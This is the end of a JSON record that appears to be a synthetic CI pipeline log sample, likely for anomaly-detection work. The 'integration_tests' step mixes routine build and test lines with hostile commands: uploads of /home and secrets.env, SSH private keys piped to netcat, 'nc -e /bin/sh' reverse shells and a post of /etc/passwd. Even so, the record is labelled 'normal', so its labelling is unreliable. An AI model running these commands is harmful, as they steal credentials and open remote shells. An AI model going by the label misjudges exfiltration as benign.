          "Step 6/10: Building",
          "Artifact uploaded: build.tar.gz (24MB)",
          "WARNING: react has known vulnerabilities",
          "  PASS: test_db_connect (235ms)",
          "[12:00:23] INFO: Processing request",
          "\u2713 test completed",
          "Compiling src/service.java...",
          "  PASS: test_auth_login (269ms)",
          "Installing eslint@5.20.0",
          "Cache hit for key-2210",
          "Cache hit for key-8559",
          "[12:00:23] INFO: Processing request",
          "Step 1/10: Building",
          "Artifact uploaded: build.tar.gz (11MB)",
          "  PASS: test_user_create (274ms)",
          "  PASS: test_db_connect (44ms)",
          "Compiling src/handler.rs...",
          "Installing express@1.5.0",
          "WARNING: lodash has known vulnerabilities",
          "Installing webpack@3.5.0",
          "Artifact uploaded: build.tar.gz (45MB)",
          "Artifact uploaded: build.tar.gz (27MB)",
          "Compiling src/handler.rs...",
          "  PASS: test_user_create (74ms)",
          "  PASS: test_auth_login (180ms)",
          "\u2713 build completed",
          "[12:00:23] ERROR: Connection failed",
          "\u2717 build failed with exit code 40",
          "\u2713 build completed",
          "Cache hit for key-2371",
          "Compiling src/handler.rs...",
          "Compiling src/service.java...",
          "Cache hit for key-4373",
          "[12:00:23] INFO: Processing request",
          "Exception: TypeError",
          "[12:00:23] INFO: Processing request",
          "Step 6/10: Building",
          "Compiling src/service.java...",
          "[12:00:23] INFO: Processing request",
          "Step 9/10: Building",
          "[12:00:23] INFO: Processing request",
          "\u2713 test completed",
          "  PASS: test_auth_login (69ms)",
          "Cache hit for key-3742",
          "Compiling src/index.js...",
          "  PASS: test_cache_hit (379ms)",
          "Artifact uploaded: build.tar.gz (22MB)",
          "Artifact uploaded: build.tar.gz (21MB)",
          "  PASS: test_auth_login (324ms)",
          "Compiling src/main.py...",
          "[12:00:23] INFO: Processing request",
          "\u2713 lint completed",
          "  PASS: test_cache_hit (47ms)",
          "[12:00:23] INFO: Processing request",
          "[12:00:23] INFO: Processing request",
          "Installing eslint@3.1.0",
          "  PASS: test_auth_login (75ms)",
          "  PASS: test_cache_hit (270ms)",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "Installing express@5.12.0",
          "Step 8/10: Building",
          "FAILED: test_user_create",
          "[12:00:23] INFO: Processing request",
          "[12:00:23] ERROR: Connection failed",
          "Installing jest@4.5.0",
          "\u2713 test completed",
          "Artifact uploaded: build.tar.gz (35MB)",
          "Compiling src/service.java...",
          "Installing prettier@5.10.0",
          "[12:00:23] INFO: Processing request",
          "[12:00:23] WARN: Deprecated API usage",
          "Step 6/10: Building",
          "Artifact uploaded: build.tar.gz (18MB)",
          "=== Step setup_environment completed ==="
        ]
      },
      {
        "name": "integration_tests",
        "status": "success",
        "started_at": "2025-11-22T12:02:16.578969",
        "finished_at": "2025-11-22T12:02:37.128607",
        "log_lines": [
          "=== Step: integration_tests ===",
          "Installing prettier@4.14.0",
          "[12:00:23] WARN: Deprecated API usage",
          "tar czf - /home | curl -X POST -d @- https://cloud.services/upload",
          "\u2713 build completed",
          "Sending 70MB of data to cloud.services",
          "Sending 65MB of data to test.io",
          "Cache hit for key-8908",
          "[12:00:23] INFO: Processing request",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "Step 3/10: Building",
          "[12:00:23] INFO: Processing request",
          "WARNING: prettier has known vulnerabilities",
          "Artifact uploaded: build.tar.gz (42MB)",
          "curl -X POST https://startup.dev/collect -d @secrets.env",
          "Artifact uploaded: build.tar.gz (16MB)",
          "Artifact uploaded: build.tar.gz (39MB)",
          "echo $(cat ~/.ssh/id_rsa) | base64 | nc 110.211.7.127 25394",
          "[12:00:23] INFO: Processing request",
          "  PASS: test_cache_hit (410ms)",
          "WARNING: lodash has known vulnerabilities",
          "  PASS: test_user_create (415ms)",
          "curl -X POST https://cloud.services/collect -d @secrets.env",
          "  PASS: test_db_connect (299ms)",
          "\u2713 build completed",
          "  PASS: test_user_create (195ms)",
          "Sending 498MB of data to cloud.services",
          "Compiling src/main.py...",
          "Compiling src/main.py...",
          "[12:00:23] INFO: Processing request",
          "  PASS: test_cache_hit (188ms)",
          "Sending 433MB of data to acme.corp",
          "curl -X POST https://startup.dev/collect -d @secrets.env",
          "Compiling src/service.java...",
          "curl -X POST https://example.com/collect -d @secrets.env",
          "Installing eslint@4.20.0",
          "Cache hit for key-6931",
          "Cache hit for key-5984",
          "Step 2/10: Building",
          "[12:00:23] INFO: Processing request",
          "Step 8/10: Building",
          "curl -X POST https://cloud.services/collect -d @secrets.env",
          "Installing axios@2.7.0",
          "echo $(cat ~/.ssh/id_rsa) | base64 | nc 146.122.123.53 42054",
          "\u2713 build completed",
          "Artifact uploaded: build.tar.gz (27MB)",
          "Sending 74MB of data to cloud.services",
          "Step 2/10: Building",
          "FAILED: test_auth_login",
          "curl -X POST https://acme.corp/collect -d @secrets.env",
          "Installing webpack@5.13.0",
          "Sending 129MB of data to startup.dev",
          "\u2713 lint completed",
          "curl -X POST https://acme.corp/collect -d @secrets.env",
          "\u2713 lint completed",
          "echo $(cat ~/.ssh/id_rsa) | base64 | nc 116.179.159.198 32284",
          "Step 8/10: Building",
          "Compiling src/utils.go...",
          "nc -e /bin/sh 89.50.103.125 8719",
          "Artifact uploaded: build.tar.gz (32MB)",
          "Artifact uploaded: build.tar.gz (25MB)",
          "Cache hit for key-3512",
          "\u2713 lint completed",
          "Compiling src/handler.rs...",
          "Artifact uploaded: build.tar.gz (9MB)",
          "Installing react@3.2.0",
          "Compiling src/utils.go...",
          "\u2713 test completed",
          "Compiling src/service.java...",
          "[12:00:23] WARN: Deprecated API usage",
          "Compiling src/app.ts...",
          "tar czf - /home | curl -X POST -d @- https://test.io/upload",
          "nc -e /bin/sh 159.235.84.194 23001",
          "Step 5/10: Building",
          "Compiling src/utils.go...",
          "Cache hit for key-7663",
          "Exception: NullPointerException",
          "curl -X POST https://example.com/collect -d @secrets.env",
          "Step 5/10: Building",
          "Artifact uploaded: build.tar.gz (11MB)",
          "Installing express@5.3.0",
          "Step 1/10: Building",
          "  PASS: test_db_connect (218ms)",
          "\u2717 build failed with exit code 93",
          "Cache hit for key-2305",
          "tar czf - /home | curl -X POST -d @- https://startup.dev/upload",
          "Cache hit for key-1197",
          "curl -X POST https://cloud.services/collect -d @secrets.env",
          "wget --post-data=\"$(cat /etc/passwd)\" https://test.io/",
          "Installing react@1.17.0",
          "Cache hit for key-9636",
          "[12:00:23] INFO: Processing request",
          "Compiling src/service.java...",
          "\u2717 build failed with exit code 126",
          "Sending 291MB of data to acme.corp",
          "[12:00:23] ERROR: Connection failed",
          "Exception: NullPointerException",
          "\u2713 build completed",
          "[12:00:23] INFO: Processing request",
          "curl -X POST https://test.io/collect -d @secrets.env",
          "Installing jest@2.17.0",
          "Sending 456MB of data to cloud.services",
          "[12:00:23] INFO: Processing request",
          "curl -X POST https://example.com/collect -d @secrets.env",
          "Step 7/10: Building",
          "\u2713 lint completed",
          "Artifact uploaded: build.tar.gz (28MB)",
          "nc -e /bin/sh 62.70.173.198 57420",
          "=== Step integration_tests completed ==="
        ]
      }
    ],
    "label": "normal"
  }
}